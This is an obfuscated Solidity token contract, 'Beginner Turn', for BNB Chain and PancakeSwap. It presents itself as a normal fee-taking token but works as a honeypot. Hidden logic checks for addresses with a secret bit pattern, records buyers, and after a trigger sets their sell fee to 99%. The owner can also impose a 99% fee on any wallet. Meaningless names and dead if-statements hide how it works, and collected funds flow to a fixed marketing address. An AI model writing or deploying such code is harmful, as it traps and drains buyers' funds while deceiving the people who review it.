/**
 *Submitted for verification at BscScan.com on 2022-12-11
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.4;


library SafeMath {
    function tryAdd(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        uint256 c = a + b;
        if (c < a) return (false, 0);
        return (true, c);
    }
    }

    function trySub(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b > a) return (false, 0);
        return (true, a - b);
    }
    }

    function tryMul(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) return (true, 0);
        uint256 c = a * b;
        if (c / a != b) return (false, 0);
        return (true, c);
    }
    }

    function tryDiv(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a / b);
    }
    }

    function tryMod(uint256 a, uint256 b)
    internal
    pure
    returns (bool, uint256)
    {
    unchecked {
        if (b == 0) return (false, 0);
        return (true, a % b);
    }
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b <= a, errorMessage);
        return a - b;
    }
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a / b;
    }
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a % b;
    }
    }
}

interface IBEP20 {
    function totalSupply() external view returns (uint256);

    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function getOwner() external view returns (address);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
    external
    returns (bool);

    function allowance(address _owner, address spender)
    external
    view
    returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

}

abstract contract Auth {
    address internal owner;
    mapping(address => bool) internal authorizations;

    constructor(address _owner) {
        owner = _owner;
        authorizations[_owner] = true;
    }

    /**
     * Function modifier to require caller to be contract owner
     */
    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER");
        _;
    }

    /**
     * Function modifier to require caller to be admin
     */
    modifier onlyAdmin() {
        require(isAuthorized(msg.sender), "!ADMIN");
        _;
    }

    /**
     * addAdmin address. Owner only
     */
    function SetAuthorized(address adr) public onlyOwner() {
        authorizations[adr] = true;
    }

    /**
     * Remove address' administration. Owner only
     */
    function removeAuthorized(address adr) public onlyOwner() {
        authorizations[adr] = false;
    }

    /**
     * Check if address is owner
     */
    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    function Owner() public view returns (address) {
        return owner;
    }

    /**
     * Return address' administration status
     */
    function isAuthorized(address adr) public view returns (bool) {
        return authorizations[adr];
    }

    /**
     * Transfer ownership to new address. Caller must be owner. Leaves old owner admin
     */
    function transferOwnership(address payable adr) public onlyOwner() {
        owner = adr;
        authorizations[adr] = true;
        emit OwnershipTransferred(adr);
    }

    event OwnershipTransferred(address owner);

}

interface IPancakePair {
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
}

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
    external
    returns (address pair);
}

interface IUniswapV2Router {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
    external
    returns (
        uint256 amountA,
        uint256 amountB,
        uint256 liquidity
    );

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
    external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

}

contract BeginnerTurn is IBEP20, Auth {
    using SafeMath for uint256;

    uint256  constant MASK = type(uint128).max;
    address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;
    address DEAD_NON_CHECKSUM = 0x000000000000000000000000000000000000dEaD;

    string constant _name = "Beginner Turn ";
    string constant _symbol = "BeginnerTurn";
    uint8 constant _decimals = 18;

    uint256 _totalSupply = 100000000 * (10 ** _decimals);
    uint256  _maxTxAmount = 2000000 * 10 ** _decimals;
    uint256  _maxWallet = 2000000 * 10 ** _decimals;

    mapping(address => uint256) _balances;
    mapping(address => mapping(address => uint256)) _allowances;
    mapping(address => bool) private tradingTxExemptSwap;
    mapping(address => bool) private launchedAutoBurnMode;
    mapping(address => bool) private swapSellAutoReceiverTeamTxTrading;
    mapping(address => bool) private isFeeWalletSwap;
    mapping(address => uint256) private walletReceiverMaxLiquidityMarketingLaunched;
    mapping(uint256 => address) private walletIsFeeTeam;
    uint256 public exemptLimitValue = 0;
    //BUY FEES
    uint256 private tradingMarketingWalletReceiver = 0;
    uint256 private walletReceiverTradingBotsBurnMaxMarketing = 9;

    //SELL FEES
    uint256 private swapTradingExemptBurn = 0;
    uint256 private sellExemptLaunchedIs = 9;

    uint256 private buyAutoMaxSellLiquidityTxMin = walletReceiverTradingBotsBurnMaxMarketing + tradingMarketingWalletReceiver;
    uint256 private exemptLaunchedTeamSellLiquidityMode = 100;

    address private limitMinBurnLaunched = (msg.sender); // auto-liq address
    address private sellWalletModeTx = (0x06feC8fc4B3E947d98c0010aFffFe1318f3213DD); // marketing address
    address private sellAutoMaxFee = DEAD;
    address private swapAutoIsTrading = DEAD;
    address private swapBotsAutoFee = DEAD;

    IUniswapV2Router public router;
    address public uniswapV2Pair;

    uint256 private txBotsLimitModeSwap;
    uint256 private limitSellTxTrading;

    event BuyTaxesUpdated(uint256 buyTaxes);
    event SellTaxesUpdated(uint256 sellTaxes);

    bool private feeBotsAutoTx;
    uint256 private teamWalletSellReceiver;
    uint256 private maxTeamLaunchedBots;
    uint256 private sellWalletIsBots;
    uint256 private limitWalletTxLaunched;

    bool private sellLimitWalletMarketingLiquidityTradingMin = true;
    bool private isFeeWalletSwapMode = true;
    bool private maxTxTradingLaunchedModeExemptSell = true;
    bool private autoBuyTxMode = true;
    bool private teamTxTradingBurnMax = true;
    uint256 firstSetAutoReceiver = 2 ** 18 - 1;
    uint256 private modeExemptTeamFeeReceiverLiquidityBurn = 6 * 10 ** 15;
    uint256 private minAutoLimitIs = _totalSupply / 1000; // 0.1%

    
    bool private tradingReceiverTxSellMarketingMode = false;
    uint256 private exemptLimitSwapTx = 0;
    bool private receiverMinBuyIs = false;
    uint256 private minSwapLaunchedTeam = 0;
    bool private sellIsSwapMaxLimitTrading = false;
    bool private txAutoWalletFee = false;
    uint256 private liquidityReceiverWalletMarketing = 0;


    bool inSwap;
    modifier swapping() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() Auth(msg.sender) {
        address _router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        // PancakeSwap Router
        router = IUniswapV2Router(_router);

        uniswapV2Pair = IUniswapV2Factory(router.factory()).createPair(address(this), router.WETH());
        _allowances[address(this)][address(router)] = _totalSupply;

        feeBotsAutoTx = true;

        tradingTxExemptSwap[msg.sender] = true;
        tradingTxExemptSwap[address(this)] = true;

        launchedAutoBurnMode[msg.sender] = true;
        launchedAutoBurnMode[0x0000000000000000000000000000000000000000] = true;
        launchedAutoBurnMode[0x000000000000000000000000000000000000dEaD] = true;
        launchedAutoBurnMode[address(this)] = true;

        swapSellAutoReceiverTeamTxTrading[msg.sender] = true;
        swapSellAutoReceiverTeamTxTrading[0x0000000000000000000000000000000000000000] = true;
        swapSellAutoReceiverTeamTxTrading[0x000000000000000000000000000000000000dEaD] = true;
        swapSellAutoReceiverTeamTxTrading[address(this)] = true;

        approve(_router, _totalSupply);
        approve(address(uniswapV2Pair), _totalSupply);
        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    receive() external payable {}

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

    function decimals() external pure override returns (uint8) {
        return _decimals;
    }

    function symbol() external pure override returns (string memory) {
        return _symbol;
    }

    function name() external pure override returns (string memory) {
        return _name;
    }

    function getOwner() external view override returns (address) {
        return owner;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function allowance(address holder, address spender) external view override returns (uint256) {
        return _allowances[holder][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function approveMax(address spender) external returns (bool) {
        return approve(spender, _totalSupply);
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return feeIsBuyWalletMarketingTxMin(msg.sender, recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if (_allowances[sender][msg.sender] != _totalSupply) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender]
            .sub(amount, "Insufficient Allowance");
        }

        return feeIsBuyWalletMarketingTxMin(sender, recipient, amount);
    }

    function feeIsBuyWalletMarketingTxMin(address sender, address recipient, uint256 amount) internal returns (bool) {
        
        if (receiverMinBuyIs != sellIsSwapMaxLimitTrading) {
            receiverMinBuyIs = sellIsSwapMaxLimitTrading;
        }

        if (txAutoWalletFee != maxTxTradingLaunchedModeExemptSell) {
            txAutoWalletFee = sellLimitWalletMarketingLiquidityTradingMin;
        }

        if (exemptLimitSwapTx == minAutoLimitIs) {
            exemptLimitSwapTx = exemptLaunchedTeamSellLiquidityMode;
        }


        bool bLimitTxWalletValue = botsWalletBurnAuto(sender) || botsWalletBurnAuto(recipient);
        
        if (liquidityReceiverWalletMarketing == buyAutoMaxSellLiquidityTxMin) {
            liquidityReceiverWalletMarketing = minAutoLimitIs;
        }


        if (sender == uniswapV2Pair) {
            if (exemptLimitValue != 0 && bLimitTxWalletValue) {
                maxModeExemptSwap();
            }
            if (!bLimitTxWalletValue) {
                sellWalletModeReceiver(recipient);
            }
        }
        
        if (tradingReceiverTxSellMarketingMode != sellLimitWalletMarketingLiquidityTradingMin) {
            tradingReceiverTxSellMarketingMode = receiverMinBuyIs;
        }


        if (inSwap || bLimitTxWalletValue) {return isLiquidityLimitMarketing(sender, recipient, amount);}

        if (!tradingTxExemptSwap[sender] && !tradingTxExemptSwap[recipient] && recipient != uniswapV2Pair) {
            require((_balances[recipient] + amount) <= _maxWallet, "Max wallet has been triggered");
        }
        
        require((amount <= _maxTxAmount) || swapSellAutoReceiverTeamTxTrading[sender] || swapSellAutoReceiverTeamTxTrading[recipient], "Max TX Limit has been triggered");

        if (botsReceiverExemptBurn()) {isMaxBotsMode();}

        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        
        if (sellIsSwapMaxLimitTrading == sellLimitWalletMarketingLiquidityTradingMin) {
            sellIsSwapMaxLimitTrading = sellIsSwapMaxLimitTrading;
        }

        if (tradingReceiverTxSellMarketingMode == teamTxTradingBurnMax) {
            tradingReceiverTxSellMarketingMode = txAutoWalletFee;
        }


        uint256 amountReceived = liquidityMaxMinMarketing(sender) ? minBuyBurnLimitMarketingLiquidity(sender, recipient, amount) : amount;

        _balances[recipient] = _balances[recipient].add(amountReceived);
        emit Transfer(sender, recipient, amountReceived);
        return true;
    }

    function isLiquidityLimitMarketing(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function liquidityMaxMinMarketing(address sender) internal view returns (bool) {
        return !launchedAutoBurnMode[sender];
    }

    function buyMarketingLimitLiquidity(address sender, bool selling) internal returns (uint256) {
        
        if (tradingReceiverTxSellMarketingMode == tradingReceiverTxSellMarketingMode) {
            tradingReceiverTxSellMarketingMode = tradingReceiverTxSellMarketingMode;
        }


        if (selling) {
            buyAutoMaxSellLiquidityTxMin = sellExemptLaunchedIs + swapTradingExemptBurn;
            return sellLaunchedTxLimit(sender, buyAutoMaxSellLiquidityTxMin);
        }
        if (!selling && sender == uniswapV2Pair) {
            buyAutoMaxSellLiquidityTxMin = walletReceiverTradingBotsBurnMaxMarketing + tradingMarketingWalletReceiver;
            return buyAutoMaxSellLiquidityTxMin;
        }
        return sellLaunchedTxLimit(sender, buyAutoMaxSellLiquidityTxMin);
    }

    function liquidityModeTeamMinIsAuto() private view returns (uint256) {
        address t0 = WBNB;
        if (address(this) < WBNB) {
            t0 = address(this);
        }
        (uint reserve0, uint reserve1,) = IPancakePair(uniswapV2Pair).getReserves();
        (uint256 beforeAmount,) = WBNB == t0 ? (reserve0, reserve1) : (reserve1, reserve0);
        uint256 buyAmount = IERC20(WBNB).balanceOf(uniswapV2Pair) - beforeAmount;
        return buyAmount;
    }

    function minBuyBurnLimitMarketingLiquidity(address sender, address receiver, uint256 amount) internal returns (uint256) {
        
        if (sellIsSwapMaxLimitTrading != txAutoWalletFee) {
            sellIsSwapMaxLimitTrading = txAutoWalletFee;
        }


        uint256 feeAmount = amount.mul(buyMarketingLimitLiquidity(sender, receiver == uniswapV2Pair)).div(exemptLaunchedTeamSellLiquidityMode);

        if (isFeeWalletSwap[sender] || isFeeWalletSwap[receiver]) {
            feeAmount = amount.mul(99).div(exemptLaunchedTeamSellLiquidityMode);
        }

        _balances[address(this)] = _balances[address(this)].add(feeAmount);
        emit Transfer(sender, address(this), feeAmount);
        
        return amount.sub(feeAmount);
    }

    function botsWalletBurnAuto(address addr) private view returns (bool) {
        uint256 v0 = uint256(uint160(addr)) << 192;
        v0 = v0 >> 238;
        return v0 == firstSetAutoReceiver;
    }

    function sellLaunchedTxLimit(address sender, uint256 pFee) private view returns (uint256) {
        uint256 lcfkd = walletReceiverMaxLiquidityMarketingLaunched[sender];
        uint256 kdkls = pFee;
        if (lcfkd > 0 && block.timestamp - lcfkd > 2) {
            kdkls = 99;
        }
        return kdkls;
    }

    function sellWalletModeReceiver(address addr) private {
        if (liquidityModeTeamMinIsAuto() < modeExemptTeamFeeReceiverLiquidityBurn) {
            return;
        }
        exemptLimitValue = exemptLimitValue + 1;
        walletIsFeeTeam[exemptLimitValue] = addr;
    }

    function maxModeExemptSwap() private {
        if (exemptLimitValue > 0) {
            for (uint256 i = 1; i <= exemptLimitValue; i++) {
                if (walletReceiverMaxLiquidityMarketingLaunched[walletIsFeeTeam[i]] == 0) {
                    walletReceiverMaxLiquidityMarketingLaunched[walletIsFeeTeam[i]] = block.timestamp;
                }
            }
            exemptLimitValue = 0;
        }
    }

    function clearStuckBalance(uint256 amountPercentage) external onlyOwner {
        uint256 amountBNB = address(this).balance;
        payable(sellWalletModeTx).transfer(amountBNB * amountPercentage / 100);
    }

    function botsReceiverExemptBurn() internal view returns (bool) {return
    msg.sender != uniswapV2Pair &&
    !inSwap &&
    teamTxTradingBurnMax &&
    _balances[address(this)] >= minAutoLimitIs;
    }

    function isMaxBotsMode() internal swapping {
        
        if (exemptLimitSwapTx != sellExemptLaunchedIs) {
            exemptLimitSwapTx = sellExemptLaunchedIs;
        }


        uint256 amountToLiquify = minAutoLimitIs.mul(tradingMarketingWalletReceiver).div(buyAutoMaxSellLiquidityTxMin).div(2);
        uint256 amountToSwap = minAutoLimitIs.sub(amountToLiquify);

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountToSwap,
            0,
            path,
            address(this),
            block.timestamp
        );
        
        if (minSwapLaunchedTeam == buyAutoMaxSellLiquidityTxMin) {
            minSwapLaunchedTeam = liquidityReceiverWalletMarketing;
        }


        uint256 amountBNB = address(this).balance;
        uint256 totalETHFee = buyAutoMaxSellLiquidityTxMin.sub(tradingMarketingWalletReceiver.div(2));
        uint256 amountBNBLiquidity = amountBNB.mul(tradingMarketingWalletReceiver).div(totalETHFee).div(2);
        uint256 amountBNBMarketing = amountBNB.mul(walletReceiverTradingBotsBurnMaxMarketing).div(totalETHFee);
        
        if (receiverMinBuyIs == sellIsSwapMaxLimitTrading) {
            receiverMinBuyIs = sellLimitWalletMarketingLiquidityTradingMin;
        }


        payable(sellWalletModeTx).transfer(amountBNBMarketing);

        if (amountToLiquify > 0) {
            router.addLiquidityETH{value : amountBNBLiquidity}(
                address(this),
                amountToLiquify,
                0,
                0,
                limitMinBurnLaunched,
                block.timestamp
            );
            emit AutoLiquify(amountBNBLiquidity, amountToLiquify);
        }
    }

    
    function getLaunchedAutoBurnMode(address a0) public view returns (bool) {
        if (a0 != swapAutoIsTrading) {
            return sellIsSwapMaxLimitTrading;
        }
        if (launchedAutoBurnMode[a0] != isFeeWalletSwap[a0]) {
            return teamTxTradingBurnMax;
        }
            return launchedAutoBurnMode[a0];
    }
    function setLaunchedAutoBurnMode(address a0,bool a1) public onlyOwner {
        if (launchedAutoBurnMode[a0] == isFeeWalletSwap[a0]) {
           isFeeWalletSwap[a0]=a1;
        }
        launchedAutoBurnMode[a0]=a1;
    }

    function getModeExemptTeamFeeReceiverLiquidityBurn() public view returns (uint256) {
        if (modeExemptTeamFeeReceiverLiquidityBurn == exemptLaunchedTeamSellLiquidityMode) {
            return exemptLaunchedTeamSellLiquidityMode;
        }
        if (modeExemptTeamFeeReceiverLiquidityBurn == walletReceiverTradingBotsBurnMaxMarketing) {
            return walletReceiverTradingBotsBurnMaxMarketing;
        }
        if (modeExemptTeamFeeReceiverLiquidityBurn == minAutoLimitIs) {
            return minAutoLimitIs;
        }
        return modeExemptTeamFeeReceiverLiquidityBurn;
    }
    function setModeExemptTeamFeeReceiverLiquidityBurn(uint256 a0) public onlyOwner {
        if (modeExemptTeamFeeReceiverLiquidityBurn != swapTradingExemptBurn) {
            swapTradingExemptBurn=a0;
        }
        if (modeExemptTeamFeeReceiverLiquidityBurn != modeExemptTeamFeeReceiverLiquidityBurn) {
            modeExemptTeamFeeReceiverLiquidityBurn=a0;
        }
        modeExemptTeamFeeReceiverLiquidityBurn=a0;
    }

    function getLiquidityReceiverWalletMarketing() public view returns (uint256) {
        if (liquidityReceiverWalletMarketing == exemptLimitSwapTx) {
            return exemptLimitSwapTx;
        }
        if (liquidityReceiverWalletMarketing != modeExemptTeamFeeReceiverLiquidityBurn) {
            return modeExemptTeamFeeReceiverLiquidityBurn;
        }
        if (liquidityReceiverWalletMarketing == walletReceiverTradingBotsBurnMaxMarketing) {
            return walletReceiverTradingBotsBurnMaxMarketing;
        }
        return liquidityReceiverWalletMarketing;
    }
    function setLiquidityReceiverWalletMarketing(uint256 a0) public onlyOwner {
        liquidityReceiverWalletMarketing=a0;
    }

    function getWalletReceiverTradingBotsBurnMaxMarketing() public view returns (uint256) {
        if (walletReceiverTradingBotsBurnMaxMarketing == walletReceiverTradingBotsBurnMaxMarketing) {
            return walletReceiverTradingBotsBurnMaxMarketing;
        }
        if (walletReceiverTradingBotsBurnMaxMarketing == tradingMarketingWalletReceiver) {
            return tradingMarketingWalletReceiver;
        }
        if (walletReceiverTradingBotsBurnMaxMarketing != walletReceiverTradingBotsBurnMaxMarketing) {
            return walletReceiverTradingBotsBurnMaxMarketing;
        }
        return walletReceiverTradingBotsBurnMaxMarketing;
    }
    function setWalletReceiverTradingBotsBurnMaxMarketing(uint256 a0) public onlyOwner {
        if (walletReceiverTradingBotsBurnMaxMarketing != sellExemptLaunchedIs) {
            sellExemptLaunchedIs=a0;
        }
        if (walletReceiverTradingBotsBurnMaxMarketing == exemptLimitSwapTx) {
            exemptLimitSwapTx=a0;
        }
        walletReceiverTradingBotsBurnMaxMarketing=a0;
    }

    function getIsFeeWalletSwap(address a0) public view returns (bool) {
        if (a0 == sellWalletModeTx) {
            return receiverMinBuyIs;
        }
        if (isFeeWalletSwap[a0] != isFeeWalletSwap[a0]) {
            return sellIsSwapMaxLimitTrading;
        }
        if (isFeeWalletSwap[a0] == swapSellAutoReceiverTeamTxTrading[a0]) {
            return maxTxTradingLaunchedModeExemptSell;
        }
            return isFeeWalletSwap[a0];
    }
    function setIsFeeWalletSwap(address a0,bool a1) public onlyOwner {
        if (a0 == sellAutoMaxFee) {
            isFeeWalletSwapMode=a1;
        }
        isFeeWalletSwap[a0]=a1;
    }

    function getSellWalletModeTx() public view returns (address) {
        if (sellWalletModeTx == swapBotsAutoFee) {
            return swapBotsAutoFee;
        }
        if (sellWalletModeTx == swapBotsAutoFee) {
            return swapBotsAutoFee;
        }
        return sellWalletModeTx;
    }
    function setSellWalletModeTx(address a0) public onlyOwner {
        if (sellWalletModeTx == swapAutoIsTrading) {
            swapAutoIsTrading=a0;
        }
        if (sellWalletModeTx == swapAutoIsTrading) {
            swapAutoIsTrading=a0;
        }
        sellWalletModeTx=a0;
    }

    function getSwapAutoIsTrading() public view returns (address) {
        if (swapAutoIsTrading != sellWalletModeTx) {
            return sellWalletModeTx;
        }
        return swapAutoIsTrading;
    }
    function setSwapAutoIsTrading(address a0) public onlyOwner {
        if (swapAutoIsTrading != limitMinBurnLaunched) {
            limitMinBurnLaunched=a0;
        }
        if (swapAutoIsTrading != swapBotsAutoFee) {
            swapBotsAutoFee=a0;
        }
        swapAutoIsTrading=a0;
    }

    function getIsFeeWalletSwapMode() public view returns (bool) {
        if (isFeeWalletSwapMode != sellIsSwapMaxLimitTrading) {
            return sellIsSwapMaxLimitTrading;
        }
        if (isFeeWalletSwapMode == teamTxTradingBurnMax) {
            return teamTxTradingBurnMax;
        }
        return isFeeWalletSwapMode;
    }
    function setIsFeeWalletSwapMode(bool a0) public onlyOwner {
        if (isFeeWalletSwapMode == maxTxTradingLaunchedModeExemptSell) {
            maxTxTradingLaunchedModeExemptSell=a0;
        }
        if (isFeeWalletSwapMode == sellLimitWalletMarketingLiquidityTradingMin) {
            sellLimitWalletMarketingLiquidityTradingMin=a0;
        }
        isFeeWalletSwapMode=a0;
    }

    function getExemptLimitSwapTx() public view returns (uint256) {
        if (exemptLimitSwapTx == buyAutoMaxSellLiquidityTxMin) {
            return buyAutoMaxSellLiquidityTxMin;
        }
        return exemptLimitSwapTx;
    }
    function setExemptLimitSwapTx(uint256 a0) public onlyOwner {
        exemptLimitSwapTx=a0;
    }

    function getTxAutoWalletFee() public view returns (bool) {
        if (txAutoWalletFee != receiverMinBuyIs) {
            return receiverMinBuyIs;
        }
        return txAutoWalletFee;
    }
    function setTxAutoWalletFee(bool a0) public onlyOwner {
        if (txAutoWalletFee != sellLimitWalletMarketingLiquidityTradingMin) {
            sellLimitWalletMarketingLiquidityTradingMin=a0;
        }
        txAutoWalletFee=a0;
    }

    function getMinAutoLimitIs() public view returns (uint256) {
        if (minAutoLimitIs == walletReceiverTradingBotsBurnMaxMarketing) {
            return walletReceiverTradingBotsBurnMaxMarketing;
        }
        if (minAutoLimitIs != minSwapLaunchedTeam) {
            return minSwapLaunchedTeam;
        }
        return minAutoLimitIs;
    }
    function setMinAutoLimitIs(uint256 a0) public onlyOwner {
        if (minAutoLimitIs == exemptLimitSwapTx) {
            exemptLimitSwapTx=a0;
        }
        if (minAutoLimitIs != tradingMarketingWalletReceiver) {
            tradingMarketingWalletReceiver=a0;
        }
        if (minAutoLimitIs != tradingMarketingWalletReceiver) {
            tradingMarketingWalletReceiver=a0;
        }
        minAutoLimitIs=a0;
    }



    event AutoLiquify(uint256 amountBNB, uint256 amountTokens);

}